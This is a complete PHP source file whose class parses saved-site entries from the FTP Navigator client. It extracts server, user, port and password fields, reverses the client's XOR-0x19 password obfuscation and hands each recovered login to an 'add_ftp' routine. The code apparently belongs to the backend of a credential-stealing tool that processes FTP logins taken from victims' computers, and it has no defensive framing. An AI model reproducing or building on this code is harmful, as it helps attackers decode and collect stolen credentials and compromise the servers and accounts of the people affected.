<?php

class Module_ftpnavigator extends Module_
{
	function Decode($Source)
	{
		if(!strlen($Source) || $Source == "1" || $Source == "0")
			return '';
		
		$Result = "";
		$SrcLen = strlen($Source) - 1;
		$Cnt 	= 0;
		
		while($SrcLen > $Cnt)
		{
			$Result .= chr(ord($Source[$Cnt])  ^ 0x19);
			$Cnt++;
		}
		
		return $Result;
	}
	
    protected function ProcessNavi($Source)
    {
        if (strlen($Source) == 0)
            return;

        $Lines = parse_lines($Source);
        foreach ($Lines as $Line)
        {
			$Host = $User = $Pass = $Port = '';
			$Elements = explode(";", $Line);
			foreach($Elements as $Element)
			{
				$Data = explode("=", $Element, 2);
				if(isset($Data[1]))
				{
					if($Data[0] == "Server")
						$Host = $Data[1];
					if($Data[0] == "User")
						$User = $Data[1];
					if($Data[0] == "Password")
						$Pass = $this->Decode($Data[1]);
					if($Data[0] == "Port")
						$Port = $Data[1];
				}
			}
			$Elements = NULL;
			if(strlen($Pass))
				$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
        }
		$Lines = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessNavi($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
